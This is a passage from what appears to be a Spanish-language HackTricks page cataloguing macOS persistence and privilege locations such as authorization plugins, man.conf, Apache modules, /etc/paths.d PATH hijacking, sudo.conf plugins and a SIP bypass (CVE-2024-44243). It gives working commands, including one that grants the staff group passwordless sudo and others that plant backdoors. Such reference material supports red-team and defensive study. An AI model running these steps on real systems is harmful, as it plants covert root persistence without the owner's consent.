    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Mueve** el bundle a la ubicación desde la que se cargará:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Finalmente, añade la **rule** para cargar este Plugin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

El **`evaluate-mechanisms`** indicará al framework de autorización que deberá **llamar a un mecanismo externo para la autorización**. Además, **`privileged`** hará que se ejecute como root.

Actívalo con:

```bash
security authorize com.asdf.asdf
```

Y entonces el grupo **staff** debería tener acceso a **sudo** (lee `/etc/sudoers` para confirmarlo).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Útil para hacer bypass del sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Pero necesitas ser root y el usuario debe usar man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/private/etc/man.conf`**
  - Se requiere root
  - **`/private/etc/man.conf`**: Cada vez que se usa man

#### Descripción y exploit

El archivo de configuración **`/private/etc/man.conf`** indica el binario/script que se usará al abrir archivos de documentación de man. Por lo tanto, se podría modificar la ruta del ejecutable para que, cada vez que el usuario use man para leer documentación, se ejecute un backdoor.<sup>[[31]](#references)</sup>

Por ejemplo, configura **`/private/etc/man.conf`** así:

```
MANPAGER /tmp/view
```

Y luego crea `/tmp/view` como:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Pero necesitas ser root y Apache debe estar en ejecución
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd no tiene entitlements

#### Ubicación

- **`/etc/apache2/httpd.conf`**
  - Se requiere root
  - Activación: Cuando se inicia Apache2

#### Descripción y explotación

Puedes indicar en `/etc/apache2/httpd.conf` que cargue un módulo añadiendo una línea como esta:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

De esta forma, Apache cargará el módulo compilado. Lo único es que debes **firmarlo con un certificado válido de Apple** o **añadir un nuevo certificado de confianza** al sistema y **firmarlo** con él.

Luego, si es necesario, para asegurarte de que el servidor se inicie, puedes ejecutar:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Ejemplo de código para Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Framework de auditoría BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Pero necesitas ser root, que auditd esté ejecutándose y provocar una advertencia
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/etc/security/audit_warn`**
  - Se requiere root
  - **Activación**: Cuando auditd detecta una advertencia

#### Descripción y exploit

Cada vez que auditd detecta una advertencia, el script **`/etc/security/audit_warn`** se **ejecuta**. Así que podrías añadirle tu payload.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

You could force a warning with `sudo audit -n`.

### Elementos de inicio

> [!CAUTION] > **Esto está obsoleto, por lo que no debería encontrarse nada en esos directorios.**

**StartupItem** es un directorio que debe ubicarse en `/Library/StartupItems/` o en `/System/Library/StartupItems/`. Una vez creado este directorio, debe contener dos archivos específicos:

1. Un **script rc**: un script de shell que se ejecuta al iniciar el sistema.
2. Un archivo **plist**, llamado específicamente `StartupParameters.plist`, que contiene varios ajustes de configuración.

Asegúrate de que tanto el script rc como el archivo `StartupParameters.plist` estén ubicados correctamente dentro del directorio **StartupItem** para que el proceso de inicio los reconozca y los utilice.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> No encuentro este componente en mi macOS, así que consulta el writeup para obtener más información.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Introducido por Apple, **emond** es un mecanismo de registro que parece estar poco desarrollado o posiblemente abandonado, aunque sigue siendo accesible. Aunque no resulta especialmente útil para un administrador de Mac, este servicio poco conocido podría servir como método de persistencia discreto para actores de amenazas, probablemente pasando inadvertido para la mayoría de los administradores de macOS.<sup>[[34]](#references)</sup>

Para quienes conocen su existencia, identificar cualquier uso malicioso de **emond** es sencillo. El LaunchDaemon del sistema para este servicio busca scripts que ejecutar en un único directorio. Para inspeccionarlo, se puede usar el siguiente comando:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Ubicación

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Se requiere root
  - **Disparador**: Con XQuartz

#### Descripción y exploit

XQuartz **ya no se instala en macOS**, así que consulta el writeup si quieres más información.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Instalar un kext es tan complicado, incluso como root, que no se considera una técnica práctica para escapar del sandbox o lograr persistencia, a menos que tengas un exploit.

#### Ubicación

Para instalar un KEXT como elemento de inicio, debe **instalarse en una de las siguientes ubicaciones**:

- `/System/Library/Extensions`
  - Archivos KEXT integrados en el sistema operativo OS X.
- `/Library/Extensions`
  - Archivos KEXT instalados por software de terceros

Puedes listar los archivos kext cargados actualmente con:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Para obtener más información sobre [**las extensiones del kernel, consulta esta sección**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Ubicación

- **`/usr/local/bin/amstoold`**
  - Se requiere root

#### Descripción y explotación

Al parecer, el `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` utilizaba este binario mientras exponía un servicio XPC... el caso es que el binario no existía, así que podías colocar algo ahí y, cuando se llamara al servicio XPC, se ejecutaría tu binario.<sup>[[35]](#references)</sup>

Ya no puedo encontrar esto en mi macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Ubicación

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Se requiere root
  - **Activación**: Cuando se ejecuta el servicio (pocas veces)

#### Descripción y explotación

Al parecer, no es muy común ejecutar este script y ni siquiera pude encontrarlo en mi macOS, así que, si quieres más información, consulta el writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Esto no funciona en las versiones modernas de macOS**

También es posible colocar aquí **comandos que se ejecutarán al inicio.** Ejemplo de un script rc.common normal:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Tareas de arranque de launchd

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Útil para eludir el sandbox: [🔴](https://emojipedia.org/large-red-circle) (requiere root)
- Requiere root, además de un **SIP bypass** o el permiso **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, según la ruta

#### Ubicación

`launchd` incorpora un plist en su sección **`__TEXT,__config`** que describe las primeras «tareas de arranque». Hay varios scripts/binarios de referencia que **no** existen de forma predeterminada y que un atacante puede crear:

- Conjunto SIP-bypass: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Conjunto TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` solo existe previamente en Sequoia y versiones posteriores)

#### Descripción y explotación

Vuelca la tabla de tareas incorporada para ver qué archivos ejecutará `launchd` y las claves compatibles (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Crear uno de los archivos mencionados (p. ej., `/etc/rc.server`) hace que `launchd` lo ejecute en el siguiente reinicio de (userspace). Las entradas más útiles están restringidas por SIP o requieren TCC SysAdminFiles/Full Disk Access, por lo que esta técnica requiere acceso root y se activa al reiniciar.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

La tarea de arranque `rc.trampoline` ejecuta un **binario de plataforma (firmado por Apple)** almacenado en la variable NVRAM `apple-trusted-trampoline` durante el arranque, pero **solo cuando se establece el boot-arg `rc.trampoline=1` y SIP está desactivado** (con un límite de tamaño de ~390&nbsp;KB y la restricción de que debe bloquearse/retornar rápidamente). Como requiere **root + SIP desactivado + un payload firmado por Apple**, en la práctica no es viable para la persistencia en entornos reales y aquí solo se incluye por completitud.<sup>[[41]](#references)</sup>

### /etc/paths y /etc/paths.d (PATH hijack)

- Útil para eludir el sandbox: [🔴](https://emojipedia.org/large-red-circle) (se necesita root para escribir)
- Se requiere root

#### Ubicación

- **`/etc/paths`** y **`/etc/paths.d/*`** — los lee **`path_helper`** (invocado desde `/etc/zprofile`) para crear el `PATH` predeterminado al iniciar sesión.

#### Descripción y explotación

Ambos pertenecen a root. Anteponer un directorio controlado por un atacante (editando `/etc/paths` o añadiendo un archivo en `/etc/paths.d/`) hace que ese directorio aparezca al principio del `PATH` de cada nuevo shell de inicio de sesión, por lo que un binario malicioso con el nombre de un comando habitual (`ls`, `git`, …) **oculta** al original y se ejecuta la próxima vez que la víctima lo invoque.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Útil para bypass de sandbox: [🔴](https://emojipedia.org/large-red-circle) (requiere root)
- Requiere root; el resultado **bypassea SIP**. Afecta a macOS **15.0–15.1**, corregido en **15.2**

#### Ubicación

- Coloca un filesystem bundle en **`/Library/Filesystems/`**.

#### Descripción y explotación

`storagekitd` tiene el entitlement **`com.apple.rootless.install.heritable`** y lanzaba los binarios de los filesystem bundles con esa capacidad para bypassear SIP **heredada**. Al colocar un filesystem bundle malicioso, un atacante podía ejecutar código con un SIP bypass para instalar **kernel extensions persistentes** o escribir en directorios `LaunchDaemon` protegidos por SIP: persistencia que sobrevive y derrota las protecciones normales.<sup>[[46]](#references)</sup> Apple lo corrigió en macOS Sequoia 15.2.

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Útil para bypass de sandbox: [🔴](https://emojipedia.org/large-red-circle) (requiere root para escribir en `/etc/sudo.conf`)
- Requiere root para instalarlo; el plugin se ejecuta dentro de **cada invocación de `sudo`** (contexto setuid-root)

#### Ubicación

- **`/etc/sudo.conf`**: las líneas `Plugin` cargan shared objects desde **`/usr/libexec/sudo/`** (o una ruta absoluta). No existe por defecto (sudo usa una policy integrada), así que crearlo es un hook limpio.

#### Descripción y explotación

`sudo` carga sus plugins de policy/aprobación/auditoría desde `/etc/sudo.conf`. Como `sudo` es setuid-root, un plugin shared-object malicioso se ejecuta con **privilegios de root cada vez que cualquier usuario ejecuta `sudo`**: persistencia root duradera que también ve cada comando sudo.<sup>[[51]](#references)</sup> macOS incluye sudo 1.9.x, que admite la API de plugins.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### Complementos CoreMediaIO DAL

Análisis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Ejemplo mínimo: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Mecanismo heredado:** Obsoleto desde macOS 12.3. macOS 14.1 y versiones posteriores deshabilitan de forma predeterminada los complementos de video heredados. Para que esta vía funcione, el usuario debe restaurar la compatibilidad con video heredado desde Recovery; disponer de un directorio con permisos de escritura no es suficiente. [Guía de soporte actual de Apple](https://support.apple.com/en-us/108387).
- Se requiere root para escribir en el directorio de complementos. La ejecución de código depende de que haya un cliente compatible que todavía cargue complementos DAL; esto no se probó en tiempo de ejecución en macOS 26.

#### Ubicación

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Se requiere root
  - **Activación:** Un cliente de cámara compatible enumera los dispositivos **después de que se haya restaurado la compatibilidad con el sistema heredado**. La validación de bibliotecas del cliente puede bloquear un complemento de terceros.

#### Descripción y explotación

Algunas aplicaciones de cámara cargaban complementos **DAL** (Device Abstraction Layer) de CoreMediaIO dentro de su proceso. La [presentación de Apple sobre camera-extension](https://developer.apple.com/videos/play/wwdc2022/10022/) indica específicamente que los complementos DAL heredados **no** funcionaban con FaceTime, QuickTime Player ni Photo Booth, y que muchos otros clientes aplican la validación de bibliotecas. Las [extensiones modernas de Core Media I/O](https://developer.apple.com/documentation/coremediaio) se ejecutan fuera del proceso, con un modelo independiente de instalación y aprobación. La técnica histórica en proceso no implica un bypass general de Camera TCC en las versiones actuales de macOS.<sup>[[53]](#references)[[54]](#references)</sup>

Observación de solo lectura en macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` existe y pertenece a root. No se verificó la compatibilidad con el sistema heredado ni la carga en ningún cliente.

### Complementos de Directory Service

Análisis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Mecanismo heredado y condicional:** Se requiere root para instalarlo, y el complemento debe estar configurado y cargarse efectivamente. La API de complementos de DirectoryService está obsoleta; consulta la configuración de Open Directory del Mac objetivo antes de considerar esto un activador durante el arranque.

#### Ubicación

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Se requiere root
  - **Activación:** `dspluginhelperd` carga un complemento configurado apto cuando Open Directory lo necesita. La [guía de Apple sobre el entorno de ejecución de complementos](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) indica que los complementos que no están configurados para iniciarse pueden cargarse de forma diferida cuando se abre su nodo.

#### Descripción y explotación

`dspluginhelperd` admite bundles de complementos heredados de DirectoryService. Un complemento malicioso puede ser una vía de ejecución con privilegios si se acepta y activa el complemento heredado; es distinto de PAM y Authorization Plugins. La existencia del directorio no demuestra que un complemento recién escrito vaya a ejecutarse en el siguiente arranque. Los manuales locales de Apple `dspluginhelperd(8)` y `opendirectoryd(8)` en macOS 26.5 todavía incluyen el helper y esta vía heredada.<sup>[[53]](#references)</sup>

Observación de solo lectura en macOS 26: existen `/Library/DirectoryServices/PlugIns` y `/usr/libexec/dspluginhelperd`. No se instaló, configuró ni cargó ningún complemento durante esta prueba.

## Técnicas y herramientas de persistencia

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, el año del Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Más allá de los buenos y viejos LaunchAgents - 1 - archivos de inicio del shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Más allá de los buenos y viejos LaunchAgents - 18 - X11 y XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Más allá de los buenos y viejos LaunchAgents - 21 - Aplicaciones reabiertas](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Más allá de los buenos y viejos LaunchAgents - 20 - Preferencias de Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Más allá de los buenos y viejos LaunchAgents - 13 - Complementos de audio](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Complementos de Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Más allá de los buenos y viejos LaunchAgents - 12 - Complementos de QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Más allá de los buenos y viejos LaunchAgents - 22 - LoginHook y LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Más allá de los buenos y viejos LaunchAgents - 4 - tareas cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Más allá de los buenos y viejos LaunchAgents - 2 - inicio de iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Más allá de los buenos y viejos LaunchAgents - 7 - complementos de xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Más allá de los buenos y viejos LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Más allá de los buenos y viejos LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Más allá de los buenos y viejos LaunchAgents - 3 - elementos de inicio de sesión](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Más allá de los buenos y viejos LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Más allá de los buenos y viejos LaunchAgents - 24 - acciones de carpeta](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Acciones de carpeta para persistencia en macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Más allá de los buenos y viejos LaunchAgents - 27 - accesos directos del Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Más allá de los buenos y viejos LaunchAgents - 17 - selectores de color](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Más allá de los buenos y viejos LaunchAgents - 26 - complementos de sincronización de Finder](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Análisis de la persistencia de "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Más allá de los buenos y viejos LaunchAgents - 16 - protector de pantalla](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Cómo conservar el acceso: protectores de pantalla para persistencia en macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Más allá de los buenos y viejos LaunchAgents - 11 - importadores de Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Más allá de los buenos y viejos LaunchAgents - 9 - panel de preferencias](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Más allá de los buenos y viejos LaunchAgents - 19 - scripts periódicos](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Más allá de los buenos y viejos LaunchAgents - 5 - módulos de autenticación conectables (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Más allá de los buenos y viejos LaunchAgents - 28 - complementos de autorización](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Robo persistente de credenciales con complementos de autorización (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Más allá de los buenos y viejos LaunchAgents - 30 - el archivo de configuración man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Más allá de los buenos y viejos LaunchAgents - 25 - módulos de Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Más allá de los buenos y viejos LaunchAgents - 31 - framework de auditoría BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Más allá de los buenos y viejos LaunchAgents - 23 - emond, el daemon de supervisión de eventos](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Más allá de los buenos y viejos LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Más allá de los buenos y viejos LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Más allá de los buenos y viejos LaunchAgents - 10 - archivos de script de aplicaciones](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Más allá de los buenos y viejos LaunchAgents - 32 - complementos de mosaico del Dock](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Más allá de los buenos y viejos LaunchAgents - 33 - widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Más allá de los buenos y viejos LaunchAgents - 34 - tareas de arranque de launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Más allá de los buenos y viejos LaunchAgents - 35 - persistir a través de NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Uso del correo electrónico para persistir en OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Modificación sospechosa de plist de reglas de Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Perfiles maliciosos: una de las amenazas más graves para los Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [El arte del malware para Mac, vol. 1 - cap. 0x2 Persistencia (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Análisis de CVE-2024-44243, un bypass de SIP de macOS mediante extensiones del kernel (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE y exfiltración de tokens de API mediante archivos de proyecto de Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nueva vulnerabilidad en GitHub Copilot y Cursor: puerta trasera en el archivo Rules (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome: métodos de instalación alternativos (extensiones externas)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Eliminar ExtensionInstallForcelist en Chrome para Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Escritura de complementos de Sudo (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Explotación remota de Mac mediante esquemas de URL personalizados (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Dos trucos de persistencia en macOS que abusan de los complementos (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Ejemplo mínimo de CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: análisis de una vulnerabilidad de TCC en macOS basada en Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Documentación del módulo `site` de Python (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
